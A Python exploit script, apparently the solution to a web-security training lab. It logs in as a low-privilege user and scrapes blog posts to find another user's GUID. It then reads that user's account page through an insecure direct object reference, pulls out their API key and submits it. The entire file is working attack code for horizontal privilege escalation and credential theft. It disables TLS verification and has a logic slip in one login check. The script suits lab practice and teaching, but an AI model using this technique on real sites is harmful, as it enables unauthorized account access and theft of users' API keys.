import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def api_key(seesion,url):

    response=seesion.get(url,verify=False)
    response=response.text
    key=re.findall("Your API Key is: (.*)</div>",response)[0]
    return key
    
def get_guid(session,url):

    response=session.get(url,verify=False)
    response=response.text

    #find any element whit postid=any single caracter
    postid=re.findall(r'postId=(\w)',response)
    postid=list(set(postid))

    for i in postid:
        response_guid=session.get(url+"/post?postId=%s"%i,verify=False)
        response_guid=response_guid.text

        if "carlos" in response_guid:
            # get giud 
            # find any element whith userid= any caracteres
            guid=re.findall("userId=(.*)'",response_guid)[0]
            print('(+) found carlos GUID . ')
            return guid
            

            
        else:
            ('(-) Error while trying to get carlos')
    

def csrf_token(session,url_login):

    response=session.get(url_login,verify=False)
    response=response.text
    soup=BeautifulSoup(response,"html.parser")
    csrf=soup.find("input",{"name":"csrf"})["value"]
    return csrf

def carlos_api_submit(session,url):

    url_login=url+"/login"

    # get CSRF TOKEN
    CSRF=csrf_token(session,url_login)
    # login 
    data={"csrf":CSRF,"username":"wiener","password":"peter"}
    response=session.post(url_login,data=data,verify=False)
    response=response.text

    if "Log out" in response:
        print('(+) Log in successfully ')

        # Get GUID for carlos 
        GUID=get_guid(session,url)

        # login to carlos acount 
        url_carlos=url+"/my-account?id=%s"%GUID
        response_carlos=session.get(url_carlos,verify=False)
        response_carlos=response_carlos.text

        if "carlos" and "Log out" in response_carlos:
            print('(+) Log in to carlos acount successfully . ')
            #get api key of carlos
            
            key=api_key(session,url_carlos)
            print('(+) Found api key . ')
            print('(+) Submiting key .....')

            # SEND API KEY 
            url_api=url+"/submitSolution"
            data={"answer":key}
            response_api=session.post(url_api,data=data,verify=False)
            response_api=response_api.text

            if "true" in response_api:
                print('(+) Lab submited successfully .')
                print("(+) Congratulations, you solved the lab!")
            else:
                print("(-) Eroor while trying to submit api key !")
                sys.exit(-1)
        else:
            print('(-) Error while Trying to Log in !')
            sys.exit(-1)

    else:
        print('(-) Error while trying to login !')
        sys.exit(-1)


def main():
    if len(sys.argv) !=2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s www.site.com'%sys.argv[0])
        sys.exit(-1)
    
    url=sys.argv[1]
    session=requests.session()
    carlos_api_submit(session,url)

if __name__ == "__main__":

    main()